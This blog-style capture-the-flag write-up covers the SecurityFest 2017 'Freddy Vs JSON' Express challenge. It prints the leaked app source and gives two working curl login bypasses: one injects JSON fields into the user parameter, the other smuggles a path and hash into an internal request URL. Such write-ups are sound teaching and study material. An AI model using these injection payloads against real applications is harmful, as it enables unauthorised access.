---
private: 'false'
layout: post
featured: false
published: true
comments: true
title: SecurityFest2017 - Freddy Vs JSON
tags: schemainjection
mathjax: false
#imagefeature: /images/sqlinjection.jpg
description: SecurityFest2017 - Freddy Vs JSON Writeup
category: Web Exploitation
chart: null
---


## Problems

```
Can you hack my friends facebook? no? what about this then?
Solves: 19
Service: http://52.208.132.198:2999/
Author: avlidienbrunn
```


## Writeup

First impression i though that was SQL Injection challenges to get into login bypass but after a while
i just figure it they using Express that was node web framework.

```
➔ curl http://52.208.132.198:2999/ -v
*   Trying 52.208.132.198...
* Connected to 52.208.132.198 (52.208.132.198) port 2999 (#0)
> GET / HTTP/1.1
> Host: 52.208.132.198:2999
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: text/html; charset=utf-8
< Content-Length: 1813
< ETag: W/"715-DSGKN9kwhacZR6TO5Ab8xoUqS9Y"
< Date: Fri, 02 Jun 2017 02:25:59 GMT
< Connection: keep-alive
< 
```

so let's try to find some file configuration that's usually used by node and i just found
`package.json` is readable for us.

```js
{
    name: "freddyvsjson",
    version: "1.0.0",
    description: "hi",
    main: "index.js",
    dependencies: {
    body-parser: "^1.17.1",
    express: "^4.15.2",
    express-jwt: "^5.3.0",
    request: "^2.81.0"
},
devDependencies: { },
scripts: {
    test: "echo "Error: no test specified" && exit 1"
},
author: "",
license: "ISC"
}
```

this file actually leaking some information for further testing. we now have idea what module used.
and again we can read `index.js` content.

```js
require('./local');
var crypto = require('crypto');
var express = require('express');
var request = require("request");
var app = express();

var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({
	extended: true
})); 

app.use(express.static('.'));

app.listen(2999, function () {
  console.log('Example app listening on port 2999!')
});

index = `<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" user-scalable="no" content="width=device-width, initial-scale=1">
      <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
      <script src="https://netdna.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
      <script src="/static/index.js"></script>
      <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css" />
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.3.0/css/mdb.min.css" />
      <link rel="stylesheet" href="/static/freddy.css" />
  </head>
  <body><section class="login-info">
<div class="container">
  <div class="row main">
       <div class="form-header elegant-color">
          <h1 class="text-center ">Authenticate</h1>
        </div>
    <div class="main-content">
            
          <div class="input-group ">
            <span class="input-group-addon"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></span></span>
            <input id="user" type="text" class="form-control text-center" name="email" placeholder="Enter your Email">
          </div>
          <div class="input-group">
            <span class="input-group-addon"><span class="glyphicon glyphicon-lock" aria-hidden="true"></span></span>
            <input id="pass" type="password" class="form-control text-center" name="password" placeholder="Enter your Password">
          </div>
          
          <div class="form-group ">
              <a href="#" id="login" type="button"  class="btn btn-danger btn-lg btn-block login-button">login</a>
          </div>
          
          <div class="form-group" id="container">
          </div>
      
      </div>
    </div></body></html>`;

app.get('/', function (req, res) {
	res.send(index);
});

function atob(str){
	return Buffer(str, 'base64').toString()
}

function btoa(str){
	return Buffer(str).toString('base64')
}

app.post("/", function(req, res){
	if(req.body.user && req.body.pass){
		user = req.body.user;
		pass = crypto.createHash('md5').update(req.body.pass).digest("hex");
		//Query internal login service
		request("http://127.0.0.1:3001/createTicket/"+user+"/"+pass, function(error, response, body){
			console.log(body);
      try{
			   body = JSON.parse(body);
      }catch(x){
         body = {"authenticated":false, "user":req.body.user, "id":0}
      }
			if(body.authenticated){
				body.response = "Congratulations: " + process.env.FLAG;
			}else{
        body.response = "Invalid username or password!";
      }
			res.send(JSON.stringify(body));
		});
	}else{
		res.send("hi");
	}
})
```

and we found another file `local.js` which is included in first line of `index.js`

```js
var express = require('express');
var crypto = require('crypto');
var localapp = express();

localapp.listen(3001, '127.0.0.1', function () {
  console.log('JWT service up!')
});

db = [
	{"user":"admin","pass":"9c72256fdb7196d2563a38b84f431491","id":"1"}
];

function atob(str){
	return Buffer(str, 'base64').toString()
}

function btoa(str){
	return Buffer(str).toString('base64')
}

function verify(user, pass){
	db_user = db[0]; //TODO: sync with LDAP instead
	if(user && user == db_user["user"]){
		if(pass && pass == db_user["pass"]){
			return db_user["id"];
		}
	}
	return 0;
}

localapp.get('/createTicket/:user/:pass', function (req, res) {
	user = req.params.user;
	pass = req.params.pass;
	userid = verify(user, pass);
	if(userid){
		res.send('{"authenticated":true, "user":"'+user+'", "id":'+userid+'}');
	}else{
		res.send('{"authenticated":false, "user":"'+user+'", "id":'+userid+'}');
	}
})
```

after trying to understand how this app works, i am trying to bruteforce this password hash `9c72256fdb7196d2563a38b84f431491` 
and my guess about SQL injection is gone because they using hardcoded db rather than using connection to some databases.

so the hash isn't crackable not get anyhing, and again i just read the `index.js` file to find some other ways to get authenticated
then i found this part in `index.js` can be exploited

```js
  try{
		   body = JSON.parse(body);
  }catch(x){
     body = {"authenticated":false, "user":req.body.user, "id":0}
  }
```

if we fail to authenticate with correct password the code will trigger catch, as we can see we can control
`req.body.user` variable so we can overwrite the `"authenticated":false`.

we can get flag with this curl
`curl -X POST http://52.208.132.198:2999/ --data 'user=admin", "authenticated":"true&pass=foobar'`

we have another way for bypass the login exploiting this line in `index.js`

```js
request("http://127.0.0.1:3001/createTicket/"+user+"/"+pass, function(error, response, body){
```

we can simply input user like `admin/<hash>?` and password `anything`, question mark at the end to ignore whatever after that

```
curl -X POST http://52.208.132.198:2999/ --data 'user=admin/9c72256fdb7196d2563a38b84f431491?&pass=foobar'
```

so we got the flag `{"authenticated":true,"user":"admin","id":1,"response":"Congratulations: SCTF{1nj3ction_5chm1nj3ctioN}"}`